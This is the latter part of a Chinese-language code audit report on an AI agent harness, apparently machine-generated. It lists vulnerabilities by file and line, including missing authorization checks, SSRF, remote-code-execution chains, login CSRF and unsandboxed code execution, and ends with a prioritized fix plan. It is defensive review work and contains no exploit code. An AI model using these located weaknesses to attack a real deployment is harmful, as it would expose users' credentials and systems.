| `modules/skill_manager/service.py:397-404` | uninstall 失败即使技能失联（状态与磁盘不一致） | 幽灵条目 |
| `modules/model_manager/provider_registry.py:39-83` | provider 事件不感知 root provider 卸载 | 陈旧连接 |

---

### 3.4 API 层（api/）

#### API-01 【中｜P1】sessions 列表 N+1 查询 + 伪分页
- **位置**：`backend/harness/api/rest/sessions.py:85-128`
- **问题**：每个会话 4–5 次查询（标题/预览/置顶/未归档计数/最后消息），N 个会话 = 4N–5N 次往返；分页为全量拉取后切片。
- **影响**：会话数增长后设置/侧栏加载线性劣化。

#### API-02 【中｜P1】插件 config GET 缺管理员校验
- **位置**：`backend/harness/api/rest/plugins.py:93-121`
- **问题**：明文返回插件配置——用户填写的密钥类配置（飞书/Telegram/OortCloud 等）不经脱敏。
- **影响**：认证启用后普通用户可读取他人配置的密钥。

#### API-03 【中｜P2】其余 API 层问题（归纳）
| 位置 | 问题 | 影响 |
|---|---|---|
| `api/rest/artifacts.py:61-77` | `offset`/`limit` 无边界校验 | 巨大 offset 使 SQLite 扫全表 |
| `api/rest/runs.py:122-131` | `resume` 缺 `require_admin` | 越权恢复 agent run |
| `api/rest/memories.py:218-220` | `summarize-now` 缺 `require_admin`（触发全库 embed） | 越权触发重计算 |
| `api/rest/settings.py:78-105` | 设置写入非原子（无临时文件+rename） | 崩溃写坏配置 |
| `api/middleware/auth.py:73` | Bearer 前缀大小写敏感 | 规范客户端互操作问题 |
| `api/deps.py:15-33` | `require_admin` 三处写法不一致（`Depends`/函数内/不用） | 校验面遗漏（见 SEC-13） |
| `api/errors.py:88-89` | 500 detail 回显原始异常（路径/SQL/堆栈） | 内部信息泄露 |
| `api/errors.py:96-99` | 无 `RequestValidationError` 处理器 | 客户端收到 FastAPI 默认 422 裸结构，错误格式不统一 |
| `api/rest/skills.py:151-160` 等 | 市场/外部安装路径失败时 `shutil.rmtree` 删目标后目录残留风险 | 卸载不干净（同类见 PLG 层） |

---

### 3.5 插件层（plugins/ 与 marketplace/）

#### PLG-01 【中｜P1】plugins/ 与 marketplace/ 双份实现漂移（含字节级重复）
- **位置**：`backend/plugins/` 与 `backend/marketplace/` 全目录
- **问题**：`marketplace/tool_calculator/main.py` 与 `plugins/tool_calculator/main.py` **字节级相同**——安装 marketplace 版本 = 复制到 plugins/，真正生效的永远是 plugins/ 副本（`plugins/__init__.py:22` 懒加载）。同类平行实现还有：mcp_client（plugins 版 SSE 失败时不广播事件，与模块版行为漂移）、scheduler（模块版与插件版并存，`:154-157` 若同时启用**双份触发**）、session_manager/memory_manager/todo_manager/tracing（各自 `Database()` 新建实例，见 ARC-04）。
- **影响**：修复一处漏一处；用户装不装 marketplace 版本行为不一致。

#### PLG-02 【中｜P1】pet_plugin 两实例并发覆盖 + 商店解锁无成本
- **位置**：`backend/plugins/pet_plugin/main.py:61-93`
- **问题**：全局单例（`:36-45`）但多标签页/多渠道并发 `feed`/`play` 基于陈旧快照写回，后写覆盖先写；商店一次性解锁全部道具（`:167-194`）无消耗。
- **影响**：宠物状态丢失更新；游戏经济系统形同虚设。

#### PLG-03 【中｜P2】其余插件层问题（归纳）
| 位置 | 问题 | 影响 |
|---|---|---|
| `plugins/integration_hub/feishu_provider.py:777-800` | tenant token 刷新失败只重试一次 | 时钟偏差/瞬时错误即断连 |
| `plugins/integration_hub/feishu_provider.py:802-808` | `_refresh_token` 无锁，多并发请求都判定"将过期"并发刷新 | 刷新风暴 |
| `plugins/integration_hub/feishu_provider.py:769` | `httpx.AsyncClient` 即建即弃（全项目通病） | 无连接复用 |
| `plugins/integration_hub/feishu_provider.py:829-835` | `_cli_auth_status` 在 async 路径里同步 `subprocess.run` | 阻塞事件循环 |
| `plugins/integration_hub/feishu_provider.py:917-923` | CLI profile 泄露：第二个 CLI bot 收到第一个 bot 的历史消息 | 多 bot 身份混淆（用户已实测遭遇） |
| `plugins/integration_hub/feishu_provider.py:833-840` | CLI 侧撤销授权后集成仍显示"已连接" | 状态假象 |
| `plugins/integration_hub/feishu_channel.py:194-219` | 入站消息无发送者白名单 | 任何群成员可驱动 agent |
| `plugins/integration_hub/feishu_channel.py:276-283, 349-373` | WS 读循环只捕获 3 类异常；`start()` 不幂等 | 其他异常静默退出循环；重复 start 双循环 |
| `plugins/integration_hub/oortcloud_provider.py:354` | AsyncClient 即建即弃 | 无连接复用 |
| `plugins/channel_telegram/main.py:47-58` | `allowed_users` 为空时不限用户 | 任意 TG 用户可驱动 |
| `plugins/tool_code_runner/main.py:132-141` | 默认 mode=local 无沙箱执行 | 代码直接落本机执行 |
| `plugins/tool_code_runner/main.py:157-178` | 错误消息拼接整个源码 | 泄露路径/密钥（同 SEC-32） |
| `plugins/mcp_client/main.py:25-38` | risk 按工具名前缀猜测（无服务端查询） | 权限分级不准 |
| `plugins/memory_manager/main.py:182-193` | 会话快照无 user_id 过滤 | 越权读他用户会话 |
| `plugins/skill_manager/main.py:130-157` | 包导入期间旧工具仍注册；版本区间失败放行 | 新旧工具并存 + 兼容检查绕过 |
| `plugins/mcp_client/main.py:135-142` | 热卸载不断底层连接 | 连接泄漏 |
| `plugins/tool_web_fetch/main.py:72` | `min(args.get("max_length", 4000), 8000)` 未转 int | 字符串入参时 min 抛 TypeError |
| `marketplace/tool_hash_encode/main.py:19-27` | bcrypt 成本 4（默认下限） | 哈希强度不足 |
| `marketplace/tool_unit_converter/main.py:121` | `float(v)` 接受 nan/inf | 单位换算输出 nan |
| `plugins/computer_use/agent.py:677-686` | 截图原图无限落盘 working_dir | 磁盘无限增长 |
| `plugins/computer_use/agent.py:548-568` | 鼠标坐标无边界校验 | 不可达坐标/异常行为 |
| `plugins/computer_use/agent.py:646-657` | file_write 无大小上限 | 磁盘打满 |
| `plugins/computer_use/agent.py:508-514` | 截图重复 base64 编解码 + read_file 读整个 7MB PNG | 内存/CPU 浪费 |
| `plugins/computer_use/agent.py:213-233` | 中文指令经剪贴板输入受 pyperclip Unicode 限制失效 | 功能缺陷 |
| `plugins/computer_use/safety.py:28-39, 61, 141` | `wait` 工具未登记风险等级 → 白名单模式下必被误拦 | 功能性 bug（实测确认） |
| `plugins/computer_use/main.py:54-59, 53` | pending 无 TTL；桌面控制器多 run 共享无锁 | 挂起任务永存；输入交错 |
| `plugins/jev_manager/main.py:15-27` | 依赖 `plugins/tool_jev_*` 硬编码约定 | 包重命名/复制即坏 |
| `plugins/provider_deepseek|doubao|qwen` | 三插件约 90% 重复代码；密钥/配置 API 不一致 | 维护三份 |
| `plugins/tool_greeter/main.py:18-23` | markdown 模板未转义用户输入 | 格式注入 |
| `plugins/tool_memory/main.py:92-98` | store 无内容大小上限 | 记忆库膨胀 |
| `plugins/session_manager/main.py:37` 等 | 多插件各自 `Database()` 新建实例（与 ARC-04 同） | 重复 schema 初始化 |

---

### 3.6 前端与桌面端（frontend/ + desktop/）

#### FE-01 【中｜P1】reloadMessages 竞态覆盖新消息
- **位置**：`frontend/src/stores/chat.ts:325-360`
- **问题**：慢网络下首次 `loadMessages` 返回时无代数校验，可用旧消息覆盖已流式完成的新消息。
- **影响**：用户看到回答"倒退"或丢失。

#### FE-02 【中｜P1】OortcloudCallback state / returnTo 无校验
- **位置**：`frontend/src/views/OortcloudCallback.vue:10-13, 28-49`
- **问题**：`state` 未与登录发起绑定即 POST 给 `/api/integrations/oortcloud/connect`（后端亦不校验 state——已向 API 层确认，后端从未签发/存储 state，回调页是唯一载体）；`returnTo` 未校验，`file://` 等 scheme 均放行。localStorage 降级容错使得攻击面扩展到普通 HTTP 部署。
- **影响**：登录 CSRF（攻击者链接静默完成受害者账号授权）+ 开放重定向。仅"偷取受害者自己的 token"这一环受 SSO 保护限制。

#### FE-03 【中｜P1】SettingsView resize 监听泄漏
- **位置**：`frontend/src/views/SettingsView.vue:370-384`
- **问题**：`$watch` 注册 `window.addEventListener('resize')`，但 watcher 仅在组件卸载时触发——快速来回切换视图时旧监听未清理，多份并行累积。
- **影响**：监听器泄漏 + 重复回调（切 10 次 = 10 份）。

#### FE-04 【中｜P1】Tauri CSP 为 null
- **位置**：`desktop/src-tauri/tauri.conf.json`（`security.csp: null`）
- **问题**：桌面端无内容安全策略，XSS（SEC-06）无第二道防线。
- **影响**：WebView 内脚本执行即可触达应用全部能力（当前 capabilities 虽最小化，但 CSP 缺失仍是纵深防御空洞）。

#### FE-05 【中｜P1】runtime.ts origin 缓存 + fail-open
- **位置**：`frontend/src/api/runtime.ts:70-84`
- **问题**：`inTauri()` 结果在 `location.origin==='tauri://localhost'` 时永久缓存；sessionStorage 中 `harness_api_base` 损坏时静默回退 `http://127.0.0.1:8000`。
- **影响**：恶意/损坏的存储值可把流量导向任意 origin。

#### FE-06 【中｜P2】其余前端问题（归纳）
| 位置 | 问题 | 影响 |
|---|---|---|
| `stores/chat.ts`（全文件 570 行） | 单文件巨型 store；WS 发送无队列/无背压感知 | 可维护性；与 SEC-30 叠加 |
| `components/MessageItem.vue:70-75` | 请求失败时从列表移除消息 | 假阴性（消息实际还在后端） |
| `components/MessageItem.vue`（549 行） | 巨型组件 | 可维护性 |
| `components/WisdomTree.vue:64-65` | 20% 概率生成零分支（死代码）；`:91,159,255` 配置硬编码不同步 | 逻辑缺陷 |
| `views/WorkflowView.vue:788-795` | 模板选择无脏检查直接清空画布；nodeId 碰撞 | 误丢工作；边静默丢弃 |
| `views/WorkflowView.vue:443-452` | 边锚点持久化从不读取 | 布局错乱 |
| `views/ChatView.vue:304` | `trace_id` 重复使用同一 UUID（复制/重发共用） | 排查混淆 |
| `desktop/launcher/launch-backend.py:15, 41` | `__file__` 被 SymLink 解析定位失败；`__pycache__` 残留僵尸子进程在打包后失联 | 启动失败；孤儿进程 |
| `desktop/src-tauri/src/lib.rs` | 单命令 `get_backend_url` 返回**编译期** URL，dev/prod 切换失效 | 打包后指向错误后端 |

---

### 3.7 跨层架构问题

#### ARC-01 【中｜P1】用户可控字符串直插代码/模板（RCE 家族总述）
SEC-03/04/05 三处 + SEC-02 共四条独立 RCE 链，共同根因是**把"数据"（节点输出、模板参数、包 URL、插件 ID）直接当"代码/路径"消费**。修复必须统一收敛到：白名单校验 + 沙箱渲染（`jinja2.sandbox.ImmutableSandboxedEnvironment`）+ 路径规范化（`Path.resolve()` + `is_relative_to` 边界比较）。

#### ARC-02 【中｜P1】插件/模块双轨制的系统性漂移
见 PLG-01。建议明确"marketplace 是分发格式、plugins/ 是唯一运行时真相"，或反向统一由模块层实现 marketplace 包。

#### ARC-03 【中｜P2】时间处理三套标准混用
`_now_iso()` 本地 naive 无秒后缀、`datetime.now(UTC).isoformat()` 带 T+时区、SQL 默认 `datetime('now')` UTC 空间分隔符，叠加 Python 侧 `utcnow()` naive 与 aware 混比（MOD-05）。实测确认 SQLite 侧解析无碍（原高危判断已修正），但跨层比较时区口径需统一。

#### ARC-04 【中｜P1】`Database()` 非单例，多实例重复初始化
- **位置**：`api/rest/permission_audit.py:79-127`、`api/rest/insights.py:43-52`、`api/rest/workflows.py:51`、`api/rest/evals_lab.py:57`、`api/rest/templates_hub.py:52`、`plugins/session_manager/main.py:37` 等多处
- **问题**：每次调用 `Database()` 都新建实例 → 新 sqlite 连接 + **完整 `init_schema()`**（20+ 张 CREATE TABLE + PRAGMA + 提交）。`permission_manager/audit.py:22-33` 的注释明确记录过同类问题的修复（"旧实现每次调用都 `Database()`……位于每次工具调用的热路径上"），但 REST 层与多个插件仍在沿用旧模式。
- **影响**：每个审计/洞察/工作流请求都重复建连 + 全量 schema 初始化；连接数与文件锁争抢随请求线性增长。

#### ARC-05 【中｜P2】长时任务无取消传播与总超时
停止信号只中断模型流与工具循环，不取消 `asyncio.sleep`/`requests.post`/工作流/子 agent；无 run 级 deadline。恶意/故障目标可无限占用资源。

#### ARC-06 【中｜P2】僵尸记录无恢复机制
`runs`/`scheduled_runs`/`ws_connections` 崩溃后永驻 running/connected 状态，无启动时的 reconciliation 逻辑。

---

## 四、整体健康度评估

| 维度 | 评分 | 依据 |
|---|---|---|
| **工程化与质量门禁** | **A** | ruff + mypy + pytest（74 个测试文件、15.6K 行）+ eslint + vitest + prettier + pre-commit + GitHub Actions 全链路 CI；CHANGELOG/README/DISCLAIMER 维护规范 |
| **架构与代码结构** | **B+** | kernel/modules/plugins/api 分层清晰、契约驱动（Protocol + Manifest）、文档密度极高（大量"为什么"注释）；扣分：双轨制漂移（ARC-02）、少数巨型文件（feishu_provider 1374 行 / agent_loop 1242 行 / WorkflowView 1231 行）、安全逻辑内嵌引擎（CORE-01） |
| **安全姿态** | **C** | 基础原语合格（PBKDF2 加盐、HMAC 常数时间比较、Fernet、路径 resolve）；但存在 4 条 RCE 链、凭据明文、XSS、SSRF、越权面密集，且多处 fail-open 设计（渠道密钥、权限服务、allow_origin 正则） |
| **性能与资源管理** | **C+** | 上下文管理缓存击穿（MOD-01）、DB 单连接串行（CORE-02）、连接池缺失（httpx 即建即弃通病）、WS 无背压（SEC-30）、MCP 端口/僵尸（SEC-15） |
| **并发与数据完整性** | **C+** | None 处理与异常吞噬控制良好；但读-改-全量覆盖写无原子性（SEC-24）、fork 竞态（SEC-20）、N+1 commit、整列重写（MOD-02）多发 |
| **缺陷密度** | **B-** | 无系统性设计腐败；P0 集中于"注入面"与"缓存"两类，均有明确修复路径 |

**综合评分：70 / 100。**

**总体判断**：这是一个**基础设施明显优于典型个人项目**的代码库——CI 全链路、类型检查、契约化插件体系、高密度文档都达到了团队项目水准，核心 Agent 循环（停止语义、人工确认、检查点、上下文压缩）的设计考虑得相当周全。主要欠账在**安全攻击面治理**（把"本地单用户工具"的信任假设延续到了 HTTP 面上）与**资源管理**（缓存、连接、背压三类经典问题各有多处实例）。这些问题均为局部缺陷而非架构性腐败，按第五节清单顺序修复可在 2–3 个迭代内将健康度推至 85+。

---

## 五、按优先级排序的修复建议清单

### P0 —— 立即处置（1–2 天）

| # | 动作 | 对应问题 | 预估工作量 |
|---|---|---|---|
| 1 | **轮换 OortCloud access_token**（OortCloud 控制台断开重连），并给 `oortcloud_state.json`/`feishu_state.json` 加 `chmod 600` + 统一走 `APIKeyEncryptor` | SEC-09, SEC-10 | 0.5 天 |
| 2 | MarkdownRenderer 改 `html: false`（或引入 DOMPurify），链接补 `rel="noopener"`；Tauri 配置 CSP | SEC-06, FE-04 | 0.5 天 |
| 3 | 计算器加幂运算上限（如 `abs(exponent) <= 1024`、结果位数上限），marketplace 副本同步 | SEC-01 | 2 小时 |
| 4 | 封堵 4 条 RCE 链：jinja2 表达式改 `ImmutableSandboxedEnvironment` + 节点输出过滤；devkit scaffold 名称白名单校验；package_installer URL 改"必须**等于**白名单条目"且禁 `ext::`；plugins install 的 `plugin_id` 正则校验 + `plugin_code` 增加确认门槛 | SEC-02/03/04/05 | 2–3 天 |
| 5 | 修复 context_manager 缓存击穿（失效时机移到写入后；`_render_markdown` 移出每消息路径） | MOD-01 | 0.5 天 |
| 6 | computer_use：`command_exec` 纳入 `deny_paths` 作用域约束；黑名单改白名单；`_check_scope` 改 `Path.is_relative_to` 边界比较；审批端点加 `require_admin` 且校验 run_id 存在 | SEC-07, SEC-08 | 1–2 天 |
| 7 | mcp_client：启动失败路径补 `terminate()`；stderr 改 `DEVNULL` 或异步抽读；readline 加上限 | SEC-15 | 1 天 |

### P1 —— 本周内（安全面收口 + 热点性能）

| # | 动作 | 对应问题 |
|---|---|---|
| 8 | skills.py / providers.py 全部写端点补 `Depends(require_admin)`；plugin config GET 脱敏 | SEC-13, API-02 |
| 9 | 渠道入站改为默认拒绝（未配置 secret 时拒绝 + 告警），`hmac.compare_digest` 比较，校验 `X-Channel-User-Id` 归属 | SEC-14 |
| 10 | web_fetch / send_webhook / mcp_http / install-external：统一 SSRF 过滤器（解析后 IP 归属校验 + 重定向逐跳校验 + 响应大小上限） | SEC-11, SEC-12 |
| 11 | 飞书 CLI 子进程加超时；挂起期间禁止并发 `receive_text`；token 刷新加锁 + 重试 | SEC-16, PLG-03 |
| 12 | provider 流式重试增加量游标（已产出长度续传） | SEC-17 |
| 13 | memory_manager：`_ensure_schema` 移到启动时；embedding 解码结果缓存（LRU + 条数上限） | SEC-18 |
| 14 | scheduler 同步 HTTP 改 `httpx.AsyncClient`；`load_pending_tasks` 加 missed-run 策略（超 N 倍周期则跳过并记录） | SEC-19, SEC-33 |
| 15 | session fork 加 `asyncio.Lock`；mark_stopped 改增量 SQL；search 引入 FTS5 | SEC-20, MOD-02, MOD-03 |
| 16 | OortCloud 授权后回填 access_token 到 providers 表（或提供显式刷新端点） | SEC-21 |
| 17 | tool_file_manager 默认 `base_dir` 收敛到受管工作区（禁用 cwd 兜底） | SEC-22 |
| 18 | sandbox：`deny_network` 增加解释器/网络库维度或干脆在无网络命名空间执行；`invoke()` 走 `_make_safe_env` | SEC-23 |
| 19 | 四类配置文件写改"临时文件 + `os.replace` + flock"原子写 | SEC-24 |
| 20 | repository 层查询补 `user_id` 条件；WS 入口补会话归属校验 | SEC-25 |
| 21 | jev 三件套加人工确认或至少审计留痕 | SEC-26 |
| 22 | computer_use `code_execute` 纳入 safety 围栏（或移除）；`_write_file` 复用带围栏的 file_write | SEC-27 |
| 23 | 登录加速率限制（按 IP+用户名） + 统一错误消息消除枚举时序差 | SEC-28 |
| 24 | 附件大小校验前置到 `f.read()` 之前（流式读到头 N 字节判定） | SEC-29 |
| 25 | WS 加背压（队列上限 + 慢客户端断开）+ 断连时取消 run 协程 | SEC-30 |
| 26 | schedules 端点补 admin + user_id 归属过滤 | SEC-31 |
| 27 | 错误消息/日志脱敏：禁用"原始异常直拼 detail"，统一 `mask_api_key` | SEC-32 |
| 28 | `Database()` 统一单例（按路径缓存的访问器），消灭 REST/插件层重复建连 | ARC-04 |
| 29 | 子 agent 事件/span/memory 查询补 `subagent_id` 维度 | MOD-04 |
| 30 | 前端：reloadMessages 加代数校验；Callback 校验 state/returnTo（sessionStorage + 后端 state 存储双管）；SettingsView resize 用 AbortController 式清理 | FE-01/02/03 |

### P2 —— 排期迭代（正确性、性能、可维护性）

| # | 动作 | 对应问题 |
|---|---|---|
| 31 | `approve_run` 校验 run_id 存在性；pending 加 TTL；桌面控制器加锁 | SEC-08 残余, PLG-03 |
| 32 | agent_loop：重试仅对可重试错误；迭代上限可配置；停止标志传 `_call_model`；generator 显式 `aclose()` | CORE-03/04/05 |
| 33 | 插件/模块双轨制收敛（明确 marketplace 为分发格式）；scheduler 双触发去重 | ARC-02, PLG-01 |
| 34 | 时间处理统一为一种规范（建议全程 aware UTC + 展示层本地化） | ARC-03 |
| 35 | 权限/隔离逻辑从 agent_loop 抽到独立层；fail-open 改 fail-closed（或显式降级策略） | CORE-01 |
| 36 | DB 访问改线程局部连接/连接池；`repository.begin/commit` 持锁 | CORE-02 |
| 37 | 长任务取消传播 + run 级总超时；启动时僵尸记录 reconciliation | ARC-05, ARC-06 |
| 38 | sessions 列表改 JOIN 单次查询；artifacts offset 边界校验；其余缺失 admin/原子写端点 | API-01/03 |
| 39 | feishu：入站发送者白名单、CLI auth 状态联动、WS 读循环异常全覆盖、start 幂等 | PLG-03 |
| 40 | telegram `allowed_users` 为空时拒绝；ip_lookup 去客户端 IP 外发 | PLG-03, SEC-34 |
| 41 | pet_plugin 写回改乐观锁；mcp_client 热卸载断连；skill_manager 卸载失败标记 | PLG-02, PLG-03 |
| 42 | 巨型文件拆分（feishu_provider / agent_loop / MessageItem / WorkflowView / chat.ts） | FE-06 |
| 43 | WisdomTree 死代码与配置同步；WorkflowView 脏检查 + nodeId 防碰撞 + 边锚点读取 | FE-06 |
| 44 | computer_use：`wait` 风险登记；截图落盘轮转；坐标边界；中文输入方案 | PLG-03 |
| 45 | provider 三插件合并为参数化单实现；crypto 加盐 KDF（PBKDF2→600k）；CORS 收紧 | PLG-03, SEC-34 |

### P3 —— 记录备查
CLI 密钥改 stdin/env（`:cli/chat.py:49`）；`SecretStore` 死代码清理；hooks 契约统一；EventBus 锁外回调；marketplace 哈希/单位工具细节；desktop `get_backend_url` 改运行时获取；`launch-backend.py` SymLink 与僵尸子进程治理。

---

## 六、做得好的方面（应当保持）

1. **质量门禁真实有效**：CI 四段式（lint/format/type/test）+ pre-commit + vitest/eslint，且 mypy 覆盖 harness 全目录——本次大量结论能被快速证伪/证实得益于这套基建。
2. **安全原语有意识**：PBKDF2 加盐哈希、`hmac.compare_digest` 常数时间比较、Fernet 加密 provider 密钥、`mask_api_key`、auth_secret 文件 0600、附件数量前置校验（代码注释记录了修复史）——基础素养明显高于平均。
3. **核心 Agent 循环设计周密**：停止语义（部分内容持久化 + stopped 标记）、人工确认超时按拒绝处理、断连时兑现挂起 Future、检查点、上下文压缩策略可插拔。
4. **文档密度与质量**：大量"为什么"型注释（subproc.py 的 Windows 事件循环坑、ext_of 的点文件特判、audit.py 的热路径教训）对后续维护者价值极高。
5. **桌面端权限最小化**：Tauri capabilities 仅 core:default + 一个自定义命令，无 fs/shell 泛授权。
6. **数据层防护**：WAL + busy_timeout + 外键级联 + 单锁保护，SQL 全面参数化（未发现拼接注入）。

---

## 附录 A：审查意见的实测修正

| 代理原始结论 | 实测结果 | 处置 |
|---|---|---|
| "spans 的 ISO-8601 T+时区格式导致 SQLite 解析失败、insights 统计静默归零"（原判高） | 用库内真实数据验证：SQLite 3.38+ 的 `datetime()`/`strftime()` 对该格式解析正确，分组统计正常（130 条正确归日） | 已降级为 [低/P2] 时区口径不一致（ARC-03） |
| "workflows `while True` 可能死循环" | 逐轮推导：每轮必消耗一个节点入 `executed`，候选集单调缩减，终止性可证 | 未列为缺陷（仅记录串行执行性能点） |
| "computer_use `wait` 工具被误拦" | `grep` 确认 safety.py 无 `wait` 登记，`_risk_of` 默认 write → 白名单模式必拦 | 已确认为功能性 bug，列入 PLG-03 |

## 附录 B：修复依赖关系

- 第一批（P0-1/2/3）相互独立，可并行；
- P0-4（RCE 链）建议先做 SEC-05（package_installer，改动最局部）验证模式，再推广到 SEC-03/04/02；
- P0-5（缓存击穿）与 P1-28（Database 单例）都触及热点路径，建议合并一个性能专项一起改并配套基准测试；
- P0-6 与 P1-22 同属 computer_use 围栏，应作为同一个安全专项；
- P1-30（前端三项）与 P0-2（XSS）可组成一个前端安全小专题。

---

*报告生成：WorkBuddy 代码体检（五路并行审查 + 安全扫描 + 抽样实测）。所有结论均经实际文件阅读或运行验证；标注"实测确认"的条目附有验证过程。*
